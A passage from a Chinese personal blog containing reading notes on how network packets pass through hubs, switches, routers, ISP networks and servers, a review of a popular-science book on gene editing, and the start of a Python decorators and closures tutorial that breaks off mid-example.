<h2 id="网络设备-——-集线器、交换机和路由器"><a href="#网络设备-——-集线器、交换机和路由器" class="headerlink" title="网络设备 —— 集线器、交换机和路由器"></a>网络设备 —— 集线器、交换机和路由器</h2><p>从计算机发送出来的网络包会通过集线器、路由器等设备转发，最终到达目的地。转发设备根据包头部中的控制信息，查询转发表判断包的目的地，然后将包朝目的地方向转发。也就意味着，HTTP 请求方法、TCP 的确认响应和序号，客户端和服务器之间的关系，这一切都与包的传输无关。所有的包在传输过程中都是独立的，相互之间没有任何关系。</p>
<h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>从信号流出网卡进入网线开始，网卡中的 PHY(MAU) 将包转换成电信号，电信号通过 RJ-45 接口进入双绞线。为了防止信号在传输过程中出现失真、减少噪声对信号的干扰，网线使用的是双绞线。双绞线通过两根信号线的缠绕抵消外源性噪声，通过改变节距抑制内源性噪声。</p>
<p>当信息通过双绞线到达集线器后，会被广播到整个网络中。以太网将包发送到所有设备，然后由设备根据接收方 MAC 地址来判断应该接收哪些包。由于集线器只是原封不动地将信息广播出去，所以即使信号受到噪声的干扰发生了失真，也会原样发送到目的地。这是接收信号的设备（交换机、路由器、服务器等），会在将信号转换成数字信息后通过 FCS（帧校验序列）校验发现错误，并将出错的包丢弃。因为丢弃的包不会触发确认响应，所以协议栈的 TCP 模块会检测到丢包，并对该包进行重传。</p>
<h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>交换机的设计是将网络包原样转发到目的地。首先，信息到达网线接口，接下来，PHY(MAU) 将网线中的信号转换为通用格式，然后传递给 MAC 模块。MAC 模块将信号转换为数字信息，然后通过包末尾的 FCS 校验错误，如果没问题册存放到缓冲区中。交换机中网线接口和后面的电路部分加在一起成为一个端口，或者说交换机的一个端口就相当于计算机上一块网卡，但是交换机的端口不具有 MAC 地址。将包存储缓冲区后，要查询一下这个包的接收方 MAC 地址是否已经在 MAC 地址表中有记录了，如果有，就可以通过交换电路将包发送到相应的端口了。特殊的，当交换机发现一个包要发回源端口是，就会直接丢弃这个包。</p>
<p>交换机在转发包的过程中，需要对 MAC 地址表的内容进行维护。</p>
<ol>
<li>收到包时，将发送方 MAC 地址以及其输入端口的号码写入 MAC 地址表中。</li>
<li>删除地址表中某条记录的操作，这是为了防止设备移动是产生问题。</li>
</ol>
<p>交换机相对于集线器的另外一个优势在于，交换机的全双工模式可以同时发送和接收数据。交换机中有自动协商功能，可以由相互连接的双方探测对方是否支持全双工模式，并自动切换成相应的工作模式。此外，交换机可以同时转发多个包。相对的，集线器会将输入信号广播到所有端口，如果同时输入多个信号就会发生碰撞，无法同时传输多路信号。从整体转发能力看，交换机高于集线器。</p>
<h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>网络包经过集线器和交换机后，就到达了路由器，并在此被转发到下一个路由器。这一步转发的工作原理和交换机类似，也是通过查表判断包转发的目标。不过在具体的操作上，路由器和交换机是有区别的。因为路由器是基于 IP 设计的，而交换机是基于以太网设计的。</p>
<p>路由器在转发包时，首先会通过通过端口将发过来的包接收进来，这一步的工作取决于端口对应的通信技术。接下来，转发模块会根据接收的包的 IP 头部中记录的接收方 IP 地址，在路由表中进行查询，一次判断转发目标。然后，转发模块将包转移到转发目标对应的端口，端口再按照硬件的规则将包发送出去，也就是转发模块委托端口模块将包发送出去。路由器的以太网端口具有 MAC 地址，因此它就能够成为以太网的发送方和接收方。端口还具有 IP 地址。当转发时，首先路由器端口会接收发送自己的以太网包，然后查询转发目标，再由相应端口作为发送方将以太网包发送出去。而交换机只将收到的包转发出去，而自己不会成为发送方或接收方。</p>
<p>在「查表判断转发目标」中，路由器是根据 IP 头部的 IP 地址来判断的。路由表中包含：目标地址、子网掩码、网关、接口、跃点数。实际上第一列的 IP 地址只包含表示子网的网络号部分的比特值，而表示主机号部分的比特值全部为 0。打个比方，路由器在转发时只看接收方地址属于哪个区。</p>
<p>为了知道网络号的比特数，路由表中还有一列子网掩码，通过子网掩码可以判断网络号的比特数。路由器会对路由表中的地址进行路由聚合或路由拆分。路由聚合就是将多个子网合并为一个子网，而路由拆分则会将一个子网拆分成多条记录。</p>
<h4 id="路由器的包接收操作"><a href="#路由器的包接收操作" class="headerlink" title="路由器的包接收操作"></a>路由器的包接收操作</h4><p>首先，信号到达网线接口部分，PHY(MAU) 模块和 MAC 模块将信号转换成数字信号，然后通过 FCS 进行错误校验，如果没问题则检查 MAC 头部中的接口方 MAC 地址，看看是不是发给自己的包，如果是就放到接收方缓冲区中，否则就丢弃。完成包接收后，路由器就丢弃包开头的 MAC 头部。接下来，路由器会根据 MAC 头部后方的 IP 头部中的内容进行包的转发操作。首先查询路由表判断转发目标，这一阶段，路由器会选择网络号的最长匹配，如果长度相同的有多条，则选择跃点数最小的记录。如果在路由表中无法找到匹配的记录，路由器会丢弃这个包，并通过 ICMP 消息告知发送方。</p>
<p>路由表中的最后一样通常为默认路由，这条记录填写接入互联网的路由器地址，被称为默认网关。</p>
<p>在将网络包发送出去之前，路由器还有工作要做。第一是，更新 IP 头部中的 TTL（生存时间）字段，包每经过一个路由器的转发，这个值就会减1，当这个值变成0时，就表示超过了有效期，这个包就会被丢弃。此外，如果包过大，路由器会通过分片功能拆分网络包。路由器也会使用 ARP 来查询下一个转发目标的 MAC 地址。</p>
<blockquote>
<p>IP(路由器) 负责将包送达通信对象这一整体过程，而其中将包传输到下一个路由器的过程则是由以太网(交换机)来负责的。</p>
</blockquote>
<h2 id="进入互联网内部"><a href="#进入互联网内部" class="headerlink" title="进入互联网内部"></a>进入互联网内部</h2><p>互联网的基本工作方式和家庭、公司网络一样，都是通过路由器来转发包，而路由器的基本结构和工作方式也没有什么不同。主要的区别在于距离的不同和路由的维护方式不同。</p>
<p>互联网接入路由器是按照接入网规则来发送包的。ADSL 连接方式如图。</p>
<p><img src="/images/2018-3-31/adsl.png" alt="enter image description here"></p>
<p>首先，客户端生成网络包，经过集线器和路由器到达互联网接入路由器，并在此从以太网包中取出 IP 包并判断转发目标。接下来，如果互联网接入路由器和 ADSL Modem 之间是通过以太网连接的，那么就会按照以太网的规则执行包发送的操作。不同的是，发送信号时，网络包会包上 MAC 头部、PPPoE 头部、PPP 头部，然后按照以太网规则转换成电信号后被发送出去。</p>
<p>互联网接入路由器将包发送出去后，包就到达了 ADSL Modem，然后，ADSL Modem 会把包拆分成很多小格子，每个小格子称为一个信元。然后，ADSL Modem 采用一种用正弦波，使用振幅(ASK)和相位调制(PSK)相结合的正交振幅调制方式对信号进行合成。信元转换为电信号之后，信号会进入一个叫做分离器的设备，然后 ADSL 信号会和电话语音信号混合起来一起从电话线传输出去。</p>
<p>从分离器出来后，就是插电话线的接口，信号会通过电话线到达大楼的 IDF 和 MDF 与外部相连接。信号通过电话线达到电话局之后，会经过配线盘、分离器到达 DSLAM（多路 ADSL Modem）。在这里，电信号会被还原成数字信息——信元。信元从 DSLAM 出来之后，会到达一个叫做 BAS 的包转发设备，然后被还原成原始的包。BAS 是用户登录操作的窗口，通过 PPP 和 PPPoE 协议实现了用户认证和配置下发的功能。接下来，BAS 会将包前面的 MAC 头部和 PPPoE 头部丢弃，取出 PPP 头部以及后面的数据。然后，BAS 会在包的前面加上隧道专用头部，并发送到隧道的出口。</p>
<p>现在网络包已经通过接入网，到达了网络运营商的接入路由器（POP）。通过 POP 发送的包会汇总到网络运行中心（NOC）中。NOC 是运营商的核心设备配备了高性能路由器。互联网内部使用 BGP 机制在运营商之间交换路由信息。对于互联网内部的路由器来说，无论最终目的地是否属于同一家运营商，都可以从路由表中查到，因此只要一次接一次按照路由表中的目标地址来转发包，最终一定可以到达目的地。</p>
<h2 id="服务器端局域网"><a href="#服务器端局域网" class="headerlink" title="服务器端局域网"></a>服务器端局域网</h2><p>网络包从互联网到达服务器的过程根据服务器部署地点的不同而不同。最简单的，服务器直接部署在公司网络上，可以从互联网直接访问。但现在几乎不使用这种方法，原因之一是公网 IP 有限，第二是安全问题，服务器完全暴露在公网中，安全漏洞也都会暴露出来，可以说是“裸奔”。</p>
<p>因此，业界一般会部署防火墙。它只允许允许发往指定服务器的指定应用程序的网络包通过，从而屏蔽其他不允许通过的包。部署防火墙后需要设置包过滤规则，首先，要观察包是如何流动的。通过接收方和发送方 IP 地址，我们可以判断出包的起点和终点。当要限制某个应用程序时，可以在判断条件中加上 TCP 头部或者 UDP 头部中的端口号，例如仅允许访问服务器的 80 端口。不仅仅要设置互联网和公开区域之间的包过滤规则，还需要设置公司内网和互联网之间之间，或者公司内网与公开区域之间的包过滤规则。总之，我们可以在防火墙中设置各种规则，判断是否允许通过。</p>
<p>当服务器的访问量上升，增加服务器线路的带宽是有效地，但并不是网络变快了就可以解决所有的问题。要解决服务器 CPU 过重的问题，可以采用多台 Web 服务器，减少每台服务器的访问量。一般，公司或组织内会使用负载匀衡器分配对服务器的访问。使用负载均衡器时，首先要将负载均衡器的 IP 地址代替 Web 服务器的实际地址注册到 DNS 服务器上。当负载均衡器收到请求，就会判断将请求转发给哪台 Web 服务器。</p>
<p>除了使用多台功能相同的 Web 服务器分担负载之外，还可以将整个系统按功能分成不同的服务器，如 Web 服务器、数据库服务器、缓存服务器等。缓存服务器时一台通过代理机制对数据进行缓存的服务器，它可以将 Web 服务器返回的数据保存在磁盘中，并可以代替 Web 服务器将磁盘中的数据返回给客户端。缓存服务器可以减轻 Web 服务器的负担，缩短 Web 服务器的处理时间。内容分发服务（CDN）也可以起到减轻服务器负担的作用。</p>
<h2 id="终点——服务器"><a href="#终点——服务器" class="headerlink" title="终点——服务器"></a>终点——服务器</h2><p>服务器根据功能的不同有很多种，其硬件和操作系统与客户端有所不同。但是，网络相关的部分，如网卡、协议栈、Socket库等功能和客户端没有什么区别。在连接过程中，客户端发起连接，而服务器等待连接操作，因此 Socket 库的用法有所不同。此外，服务器的程序可以同时和多台客户端计算机进行通信。</p>
<p>当服务器启动并读取配置文件时完成初始化操作后，就会运行等待连接模块。连接模块会创建套接字，然后进入等待连接的暂停状态。接下来，当客户端发起连接时，这个模块会恢复运行并接受连接，然后启动客户端通信模块，并移交完成连接的套接字。此后，客户端通信模块就会使用已连接的套接字与客户端通信，通信结束后，这个模块就退出了。</p>
<p>服务器调用 Socket 库创建套接字。</p>
<ol>
<li>创建套接字</li>
<li>将套接字设置为等待连接状态</li>
<li>接受连接</li>
<li>收发数据</li>
<li>断开管道并删除套接字</li>
</ol>
<p>首先，协议栈调用 <code>socket</code> 创建套接字，接下来调用 <code>bind</code> 将端口号写入套接字中。设置好端口号之后，协议栈会调用 <code>listen</code> 向套接字写入等待连接状态这一控制信息。这样一来，套接字就会开始等待来自客户端的连接网络包。然后，协议栈会调用 <code>accept</code> 来接受连接。一旦客户端的包到达，就会返回响应包并开始接受连接操作。接下来，协议栈会给等待连接的套接字复制一个副本，然后将连接对象等控制信息写入新的套接字中。到这里，我们就创建了一个新的套接字，并和客户端套接字连接在一起了。而最初的那个套接字还会以等待连接的状态继续存在，当再次调用 <code>accept</code>，客户端连接包到达时，它又可以再次执行接收连接操作。为了区分端口号相同的套接字，服务器使用：客户端 IP 地址、客户端端口号、服务器 IP 地址和服务器端口号识别套接字。</p>
<p>服务器收到网络包后，首先由网卡接收信号，然后将其还原成数字信息。接下来需要根据包末尾的帧校验序列（FCS）来校验错误，然后与包末尾的 FCS 值进行比较。当 FCS 一直，接下来检查 MAC 头部中的接收方MAC 地址，看看这个包是不是发给自己的。然后，还原后的数字信息被保存在网卡内部的缓冲区中。因为接下来接收操作需要 CPU 参与，因此网卡需要通过中断将网络包到达的的事件通知给 CPU。CPU 切换到网卡任务后，网卡驱动会从缓冲区中将包读取出来，根据头部中字段调用负责处理该协议的软件。这里，会调用 TCP/IP 协议栈，并将包转交给它。当网络包转交到协议栈时，IP 模块会首先开始工作，检查 IP 头部。IP 模块首先会检查 IP 头部的格式是否符合规范，然后检查接收方 IP 地址，看包是不是发给自己的，若不是，则丢弃。接下来需要检查包有没有被分片，如果是分片的包，则将包暂时存放在内存中，等所有分片到达之后将所有分片组装起来还原成原始包；如果没有分片，则直接保留接收时的样子，不需要进行重组。</p>
<p>接下来检查 IP 头部的协议号字段，并将包转交给相应的模块（TCP/UDP）。如果收到的包是 TCP 发起连接的包，则 TCP 模块会确认头部控制位 SYN；检查接收方端口号；为相应等待连接套接字复制一个新的副本；记录发送方 IP 地址和端口号等信息。</p>
<p>当收到的数据包时，TCP模块会：</p>
<ol>
<li>根据收到包的发送方 IP 地址、发送方端口号、接收方 IP 地址、接收方端口号找到对应的套接字</li>
<li>将数据块拼合起来保存在接收缓冲区中</li>
<li>向客户端返回 ACK</li>
</ol>
<p>当数据收发完成后，便开始执行断开操作。服务器程序首先会调用 Socket 库的 <code>close</code>，TCP 模块会生成一个控制位 FIN 为 1 的 TCP 头部，并委托 IP 模块发送给客户端。当客户端收到这个包后，会返回一个 ACK 号。接下来客户端调用 <code>close</code>，生成一个 FIN 为 1 的 TCP 头部发给服务器，服务器再返回 ACK 号，这时断开操作就完成了。当断开操作完成后，套接字会在一段时间后被删除。</p>
<p>在 Web 服务器中，<code>read</code> 获取的数据内容就是 HTTP 请求消息。服务器程序会根据收到的请求消息从的内容进行相应的处理，并生成响应消息，再通过 <code>write</code> 返回给客户端。请求消息包括一个“方法”的命令，以及数据源的 URI，服务器程序会根据这些内容想客户端返回数据。</p>
<p>当服务器完成对请求消息的各种处理后，就可以返回响应消息了。这与客户端想服务器发送请求消息是时的工作过程相同。Web 服务器发送的响应消息会被分成多个包发送给客户端，然后客户端需要接受数据。</p>
<p>浏览器在收到数据后，为了显示内容，首先需要判断响应消息中的数据属于那种类型，原则上通过 <code>Content-Type</code> 头部字段判断。在得到数据类型后，浏览器就可以做出相应的反应。最终，浏览器就可以显示数据，并等待用户下一个操作了。</p>
<p>从输入网址到显示出网页内容，这个过程只有短短几秒。然后，这几秒的背后，离不开各种设备和软件的相互配合。这段探索之旅，我们可以看到网络的全貌，之后，就可以根据自己的兴趣，深入探索了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2018/03/26/%E4%B8%8A%E5%B8%9D%E7%9A%84%E6%89%8B%E6%9C%AF%E5%88%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/03/26/%E4%B8%8A%E5%B8%9D%E7%9A%84%E6%89%8B%E6%9C%AF%E5%88%80/" class="post-title-link" itemprop="url">上帝的手术刀</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2018-03-26 22:56:23" itemprop="dateCreated datePublished" datetime="2018-03-26T22:56:23+08:00">2018-03-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/booknotes/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2018/03/26/%E4%B8%8A%E5%B8%9D%E7%9A%84%E6%89%8B%E6%9C%AF%E5%88%80/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/03/26/上帝的手术刀/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="上帝的手术刀"><a href="#上帝的手术刀" class="headerlink" title="上帝的手术刀"></a>上帝的手术刀</h1><p>从中学生物课本上，我们就知道了 DNA 里保存了人类的全部遗传信息。不同的细胞根据功能的不同，利用 DNA 的不同部分合成各式各样的蛋白质，蛋白质决定了我们生命的特点。毕业多年，我把曾经学到过的生物知识都还给老师了，也对现在生物科技的发展状况毫不了解。听说过几家上市的生物科技公司，可对他们具体拥有什么科技，推出了什么产品一无所知。《上帝的手术刀》是浙江大学教授王立铭写的一本科普书籍，从古希腊哲学家对生命的猜想，到现在各大实验室的生物科技竞争，到对未来生物科技的展望，这本书可以当成一部人类探索遗传秘密的编年史。</p>
<p>人类从石器时代进步到农业时代的一大标志就是开始利用生物遗传的力量来为自己生产食物。在驯化了野生小麦、驯养肉猪的过程中，人类就是利用遗传的规律改造其他物种，而保留自己需要的性状。古希腊哲学家任务生物体内存在“泛生子（pangene）”颗粒，它记录了遗传信息并在交配后进入下一代体内。19世纪达尔文和进化论提出生物进化，孟德尔提出基因的显性和隐形，证明基因会在生物的一代代繁衍中顽强的存在，并在合适的情况下重新表现出来，影响生物的性状。20世纪以来，人类逐渐在实验中证明了 DNA 是遗传物质，发现了 DNA 的双螺旋结构和在遗传过程中的半保留复制，并通过实验证明了 DNA 中每三个碱基对应一个密码子，每个密码子编码了唯一的氨基酸，氨基酸最终被装配为蛋白质，蛋白质催生各种化学反应，最终多种生命现象得以发生。一系列实验的结论最终被概括为“中心法则”：</p>
<blockquote>
<p>DNA -&gt; RNA -&gt; 蛋白质。DNA 首先根据碱基互补原则以自己为模板制造一条 RNA 长链；然后 RNA 再根据3碱基对应一个氨基酸的原则制造蛋白质。</p>
</blockquote>
<p>随后，基于对基因的了解来诊断、治愈遗传疾病的尝试也被积极开展。镰刀型红细胞贫血症、艾滋病的治愈案例的出现促使全世界展开了上百项基因治疗实验，但是其中却大多数以失败告终。基因治疗成功的案例吸引大量资源和资金的注入，使得更多研究得以展开，但是更多的失败案例则让基因治疗转入低谷。在不断起伏中，“基因编辑”的技术储备逐渐完成。</p>
<p>基因编辑的“三件套”为：</p>
<ol>
<li>基因组GPS：锌手指蛋白组合</li>
<li>基因组剪刀：FokⅠ蛋白的剪切模块</li>
<li>基因组针线：细胞内天然存在的两套DNA断点修复机制</li>
</ol>
<p>2011和2012年的“神话”蛋白和CRISPR蛋白的相继发现把人类正式带入了基因的“完整可编程”时代。</p>
<p>目前，基因编辑技术的可以的应用阶段可以简单总结为“来自人体-体外处理-体内治疗”，这样的好处在于安全性，避免外源基因给人来带来危害；未来，为了治疗更广泛的疾病，基因编辑的第二阶段——“来自人体-体内处理-体内治疗”是自然而然的发展；为了实现基因治疗的普适性，降低治疗成本，基因编辑拜托“来自人体”的限制，医药企业将能够开发的大批量生产普适药物，让普通人也能够承担；在未来的未来，“体内预防”也或许能够被实现。关于基因编辑的前景，还有广阔的发展的想象空间。</p>
<p>在美好的发展前景后，基因技术也带来了争议、风险，伦理的讨论也无休无止。疾病的“预防”被实现后，那么“改善”也会随之而来，人类可以按自己的喜好来修改自己或者后代的特征。因为能负担基因改善的人总是少数，那么这是不是会加剧不平等、固话社会阶层？在极端情况下，人类甚至可以通过编辑基因来产生新的物种。那时候，人类自己会处于什么位置？这些问题人类只能随着技术的进步去一一应对。</p>
<p>书中对可以基础研究的价值表示了极大的肯定。在基因技术的发展过程中，出现了无数的柳暗花明，如 DNA 双螺旋结构的证明，到后来锌手指蛋白、“神话”蛋白、CRISPR蛋白的发现统统都是在生物领域的冷门基础研究中，“幸运”地被发现的。而这些幸运的发现总是让人感叹大自然的鬼斧神工。生物进化过程中，获得了一整套无比简洁而高效的机制，比如只使用3个碱基对应一个氨基酸，而绝不浪费额外的资源；基于编辑的“三件套”更是全部本来就存在于生物体内，人类所做的并不是重新设计，而是发现和推广。</p>
<p>作为一个程序员，我相信科技发展是不可逆的，它能够让人类社会想好的方向发展。现在，我们经历的每个瞬间都有可能被载入史册，无论是生物科技，还是人工智能，我们都应该用开放的心态拥抱他们，也用严格的监管管控它们，耐心期待技术的成熟，并为人所用。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2017/07/11/python-decorator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/11/python-decorator/" class="post-title-link" itemprop="url">Python 中的装饰器和闭包</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2017-07-11 13:59:46" itemprop="dateCreated datePublished" datetime="2017-07-11T13:59:46+08:00">2017-07-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/programming-language/" itemprop="url" rel="index"><span itemprop="name">编程语言</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2017/07/11/python-decorator/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/07/11/python-decorator/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>函数装饰器（Function decotator）让我们可以通过在代码中“标记”函数来增强它的行为。这是一种很强大的特性，但是充分理解它需要首先理解闭包（clousure）。</p>
<p>Python 中的最新的被保留的关键字之一是 <code>nonlocal</code>，在 Python 3.0 中被引入。如果你仅仅使用以类为中心的面向对象编程方法的话，你可能从来都没有使用过这个关键字。然而，如果你想实现你自己的函数装饰器，你必须完全理解闭包，那么这时，<code>nonlocal</code> 关键字就是必须的。</p>
<p>除了在装饰器中的应用外，闭包还可以再异步编程中实现回调（callback），也可以在函数式编程中发挥作用。</p>
<p>为了解释装饰器究竟如何工作，我们首先需要解释：</p>
<ul>
<li>Python 怎样处理装饰器的语法</li>
<li>Python 怎么确定某个变量是否为局部变量</li>
<li>闭包如何工作</li>
<li><code>nolocal</code> 解决了什么问题</li>
</ul>
<p>以这四个问题为基础，我们继续研究其他装饰器主题：</p>
<ul>
<li>实现一个运行良好的装饰器</li>
<li>标准库中有趣的装饰器</li>
<li>实现一个参数化的装饰器</li>
</ul>
<p>我们从一个简单的介绍开始。</p>
<h2 id="装饰器-101"><a href="#装饰器-101" class="headerlink" title="装饰器 101"></a>装饰器 101</h2><p>装饰器是一个将另外一个函数作为参数的可调用对象（callable），作为参数的函数为称为 decorated function。装饰器可能对函数做一些特殊处理，然后再返回或者用另外一个函数来替换它。</p>
<p>换句话说，假设有一个叫做<code>decorate</code>的装饰器，下面这段代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@decorate</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"running target()"</span>)</span><br></pre></td></tr></table></figure>

<p>和这样写有完全一致的结果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"running target()"</span>)</span><br><span class="line">	</span><br><span class="line">target = decorate(target)</span><br></pre></td></tr></table></figure>

<p>这两个代码片段的结尾都是一样的，<code>target</code> 并不一定要指向原来的 <code>target</code> 函数，而是指向 <code>decorate(target)</code> 返回的函数。我们可以确认一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deco</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">()</span>:</span></span><br><span class="line">        print(<span class="string">"running inner()"</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@deco</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running target()"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>target()</span><br><span class="line">running inner()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>target</span><br><span class="line">&lt;function __main__.deco.&lt;locals&gt;.inner&gt;</span><br></pre></td></tr></table></figure>

<p>严格来说，装饰器只是一种语法糖。就像我们看到的，你可以简单地把装饰器当做一个可调用对象，传入一个函数作为参数。</p>
<p>总结一下：首先，装饰器可以用另外一个函数来代替被装饰的函数；其次，装饰器在模块被加载时理解执行。</p>
<h2 id="Python-执行装饰器的时机"><a href="#Python-执行装饰器的时机" class="headerlink" title="Python 执行装饰器的时机"></a>Python 执行装饰器的时机</h2><p>装饰器的一个关键特性是他们在被装饰函数（decorated function）被定义后立即执行。这通常发生在<code>导入时间</code>（<code>import time</code>）。考虑下面的例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""registraion.py"""</span></span><br><span class="line">registry = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(func)</span>:</span></span><br><span class="line">    print(<span class="string">"running register(%s)"</span> % func)</span><br><span class="line">    registry.append(func)</span><br><span class="line">    <span class="keyword">return</span> func</span><br><span class="line"></span><br><span class="line"><span class="meta">@register</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running f1()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@register</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running f2()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running f3()"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"running main()"</span>)</span><br><span class="line">    print(<span class="string">"registry -&gt;"</span>, registry)</span><br><span class="line">    f1()</span><br><span class="line">    f2()</span><br><span class="line">    f3()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>registry</code> 保存了被 <code>@register</code> 装饰的函数的引用</li>
<li>装饰器 <code>register</code> 接受一个函数作为参数</li>
<li><code>f1</code> 和 <code>f2</code> 被 <code>@register</code> 装饰，<code>f3</code> 没有被装饰</li>
<li><code>main</code> 函数打印了 <code>registry</code>，然后调用了 <code>f1</code>, <code>f2</code>, <code>f3</code></li>
<li><code>main</code> 仅仅在运行该脚本时才会被调用</li>
</ul>
<p>运行这个脚本的输出是：</p>
